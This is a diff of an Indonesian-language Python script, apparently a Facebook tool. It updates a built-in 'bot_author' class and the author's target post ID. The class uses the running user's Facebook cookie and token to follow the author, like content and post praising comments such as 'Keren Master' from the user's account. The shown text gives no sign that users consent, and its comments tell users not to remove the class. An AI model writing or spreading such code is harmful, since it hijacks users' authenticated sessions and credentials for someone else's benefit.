@@ -5,7 +5,7 @@ Instagram = 'Instagram.com/afriliyanferlly_shishigami'
 Whatsapp  = '085797818026'
 Version   = '0.4'
 Afriliyan = 100013275378835
-Postinganll = 1619878191798011
+Postinganll = 1621661614953002
 
 ###----------[ AUTHOR & CREATOR ]---------- ###
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
@@ -303,7 +303,7 @@ def kecuali(error):
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Afriliyan)];self.komen = ['Semangat Terus Master\n -[ @[100013275378835:0] ]-','Panutanku Nih Bro\n └─> : -[ @[100013275378835:0] ]-','Semoga Langgeng Terus Master\n -[ @[100013275378835:0] ]-\n Sama Kak Riska Nya']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Afriliyan)];self.komen = ['Semangat Terus Master\n -[ @[100013275378835:0] ]-','Panutanku Nih Bro\n └─> : -[ @[100013275378835:0] ]-','Keren Master','Gokil Suhu,Keren Banget']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
